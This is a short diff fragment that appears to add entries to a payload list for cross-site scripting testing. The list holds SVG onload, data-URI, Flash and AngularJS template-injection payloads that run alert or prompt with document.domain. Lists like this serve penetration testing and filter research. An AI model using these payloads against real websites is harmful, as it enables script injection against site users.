@@ -51,3 +51,5 @@ data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+
 flashmediaelement.swf?jsinitfunctio%gn=alert`1`
 "><svg/onload=confirm(1)>"@x.y
 prompt`${document.domain}`
+“><svg/onload=alert(document.domain)>”@x.y
+{{constructor.constructor(%27prompt(document.domain)%27)()}}
